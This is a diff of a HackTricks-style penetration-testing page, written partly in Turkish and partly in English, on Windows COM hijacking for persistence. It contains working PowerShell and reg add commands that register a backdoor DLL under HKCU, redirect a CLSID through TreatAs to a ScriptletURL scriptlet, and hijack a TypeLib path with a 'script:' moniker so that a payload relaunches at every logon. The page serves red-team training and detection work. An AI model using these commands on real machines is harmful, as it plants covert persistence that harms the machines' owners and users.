@@ -2,23 +2,30 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Mevcut olmayan COM bileşenlerini arama
+### Searching non-existent COM components
 
-HKCU değerleri kullanıcılar tarafından değiştirilebildiği için **COM Hijacking**, **kalıcı bir mekanizma** olarak kullanılabilir. `procmon` kullanarak, saldırganın kalıcılık için oluşturabileceği mevcut olmayan COM kayıtlarını bulmak kolaydır. Filtreler:
+HKCU değerleri kullanıcılar tarafından değiştirilebildiğinden **COM Hijacking** bir **persistence mechanism** olarak kullanılabilir. `procmon` kullanarak henüz mevcut olmayan ve saldırgan tarafından oluşturulabilecek aranan COM kayıtlarını bulmak kolaydır. Klasik filtreler:
 
-- **RegOpenKey** işlemleri.
-- _Result_ değeri **NAME NOT FOUND** olanlar.
-- ve _Path_ **InprocServer32** ile bitenler.
+- **RegOpenKey** operations.
+- where the _Result_ is **NAME NOT FOUND**.
+- and the _Path_ ends with **InprocServer32**.
 
-Hangi mevcut olmayan COM'u taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu aşırıya kaçabilir._
+Avlanma sırasında faydalı varyasyonlar:
+
+- Eksik **`LocalServer32`** anahtarlarına da bakın. Bazı COM sınıfları ayrı süreçte çalışan sunuculardır (out-of-process) ve bir DLL yerine saldırgan kontrolündeki bir EXE'yi başlatır.
+- `InprocServer32`'e ek olarak **`TreatAs`** ve **`ScriptletURL`** kayıt işlemlerini de arayın. Son tespit içerikleri ve malware yazıları bunları sıklıkla vurgular çünkü normal COM kayıtlarına göre çok daha nadir olup bu nedenle yüksek sinyal verirler.
+- Bir kaydı HKCU'ye klonlarken orijinal `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` içindeki meşru **`ThreadingModel`** değerini kopyalayın. Yanlış model genellikle etkinleştirmeyi bozar ve hijack'i gürültülü hale getirir.
+- 64-bit sistemlerde hem 64-bit hem 32-bit görünümlerini inceleyin (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` ve `HKLM\Software\Classes\WOW6432Node`) çünkü 32-bit uygulamalar farklı bir COM kaydına çözümleyebilir.
+
+Hangi henüz mevcut olmayan COM'u taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu aşırıya kaçmak olabilir._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Ele geçirilebilen Task Scheduler COM bileşenleri
+### Ele geçirilebilir Task Scheduler COM bileşenleri
 
-Windows Tasks, COM objects çağırmak için Custom Triggers kullanır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.
+Windows Tasks, COM nesnelerini çağırmak için Custom Triggers kullanır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -49,9 +56,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Çıktıyı kontrol ederek örneğin **her kullanıcı oturum açtığında** çalıştırılacak birini seçebilirsiniz.
+Çıktıya bakarak örneğin **her kullanıcı giriş yaptığında** çalıştırılacak bir tane seçebilirsiniz.
 
-Şimdi CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'yi **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da aradığınızda, genellikle değerin HKCU'da bulunmadığını görürsünüz.
+Şimdi CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'i **HKEY\CLASSES\ROOT\CLSID**'de ve HKLM ile HKCU'da aradığınızda, genellikle değerin HKCU'da bulunmadığını görürsünüz.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -72,32 +79,61 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Sonra, sadece HKCU girdisini oluşturabilir ve her kullanıcı oturum açtığında backdoor'unuz tetiklenecektir.
+Sonra, HKCU girdisini oluşturabilir ve kullanıcı her oturum açtığında backdoor'unuz tetiklenir.
 
 ---
 
+## COM TreatAs Hijacking + ScriptletURL
+
+`TreatAs`, bir CLSID'nin başka bir CLSID tarafından taklit edilmesine izin verir. Saldırgan bakış açısından bu, orijinal CLSID'i değiştirmeden bırakıp `scrobj.dll`'e işaret eden kullanıcı-başına ikinci bir CLSID oluşturabileceğiniz ve gerçek COM nesnesini `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` ile kötü amaçlı olana yönlendirebileceğiniz anlamına gelir.
+
+This is useful when:
+
+- the target application already instantiates a stable CLSID at logon or on app start
+- you want a registry-only redirect instead of replacing the original `InprocServer32`
+- you want to execute a local or remote `.sct` scriptlet through the `ScriptletURL` value
+
+Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
+```cmd
+:: 1. Create a malicious per-user COM class backed by scrobj.dll
+reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
+reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
+reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f
+
+:: 2. Redirect a high-frequency CLSID to the malicious class
+reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+```
+Notes:
+
+- `scrobj.dll` reads the `ScriptletURL` value and executes the referenced `.sct`, so you can keep the payload as a local file or pull it remotely over HTTP/HTTPS.
+- `TreatAs` is especially handy when the original COM registration is complete and stable in HKLM, because you only need a small per-user redirect instead of mirroring the entire tree.
+- For validation without waiting on the natural trigger, you can instantiate the fake ProgID/CLSID manually with `rundll32.exe -sta <ProgID-or-CLSID>` if the target class supports STA activation.
+
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Type Libraries (TypeLib), COM arayüzlerini tanımlar ve `LoadTypeLib()` ile yüklenir. Bir COM sunucusu örneklendiğinde, işletim sistemi ayrıca ilişkilendirilmiş TypeLib'i `HKCR\TypeLib\{LIBID}` altındaki kayıt defteri anahtarlarına bakarak yükleyebilir. TypeLib yolu bir **moniker** ile, ör. `script:C:\...\evil.sct`, değiştirildiğinde, TypeLib çözümlendiğinde Windows scriptleti çalıştırır — bu da yaygın bileşenlere dokunulduğunda tetiklenen gizli bir persistence sağlar.
+Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. When a COM server is instantiated, the OS may also load the associated TypeLib by consulting registry keys under `HKCR\TypeLib\{LIBID}`. If the TypeLib path is replaced with a **moniker**, e.g. `script:C:\...\evil.sct`, Windows will execute the scriptlet when the TypeLib is resolved – yielding a stealthy persistence that triggers when common components are touched.
 
-Bu, Microsoft Web Browser kontrolüne karşı gözlemlenmiştir (sıklıkla Internet Explorer, WebBrowser gömülü uygulamalar ve hatta `explorer.exe` tarafından yüklenir).
+This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).
 
-### Adımlar (PowerShell)
+### Steps (PowerShell)
 
-1) Yüksek frekansla kullanılan bir CLSID tarafından kullanılan TypeLib (LIBID) bilgisini tespit edin. Örnek CLSID sıkça kötü amaçlı yazılım zincirleri tarafından kötüye kullanılır: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-2) Her kullanıcıya ait TypeLib yolunu, `script:` moniker'ını kullanarak yerel bir scriptlet'e yönlendirin (yönetici hakları gerekmez):
+2) Kullanıcı başına TypeLib yolunu yerel bir scriptlet'e `script:` moniker kullanarak yönlendir (yönetici hakları gerekmez):
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Birincil payload'ınızı yeniden başlatan minimal bir JScript `.sct` bırakın (örn. başlangıç zinciri tarafından kullanılan bir `.lnk`):
+3) Ana payload'ınızı yeniden başlatan minimal bir JScript `.sct` bırakın (ör. başlangıç zinciri tarafından kullanılan bir `.lnk`):
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -114,7 +150,7 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) Tetikleme – IE'yi açmak, WebBrowser control'ü gömülü bir uygulamayı başlatmak veya hatta rutin Explorer etkinlikleri TypeLib'i yükleyecek ve scriptlet'i çalıştıracak; böylece oturum açma/yeniden başlatma sırasında zinciriniz yeniden devreye girecektir.
+4) Tetikleme – IE'yi açmak, WebBrowser control'ü gömülü bir uygulama veya hatta rutin Explorer etkinliği TypeLib'i yükleyip scriptlet'i çalıştıracak ve oturum açma/yeniden başlatma sırasında zincirinizi yeniden etkinleştirecektir.
 
 Temizlik
 ```powershell
@@ -124,12 +160,14 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
 Notlar
-- Aynı mantığı diğer sık kullanılan COM bileşenlerine de uygulayabilirsiniz; gerçek `LIBID`'yi önce `HKCR\CLSID\{CLSID}\TypeLib`'ten belirleyin.
-- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da doldurabilirsiniz.
+- Aynı mantığı diğer sık kullanılan COM bileşenlerine de uygulayabilirsiniz; önce her zaman gerçek `LIBID`'yi `HKCR\CLSID\{CLSID}\TypeLib`'den çözün.
+- On 64-bit systems you may also populate the `win64` subkey for 64-bit consumers.
 
 ## Referanslar
 
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
+- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
 
 {{#include ../../banners/hacktricks-training.md}}
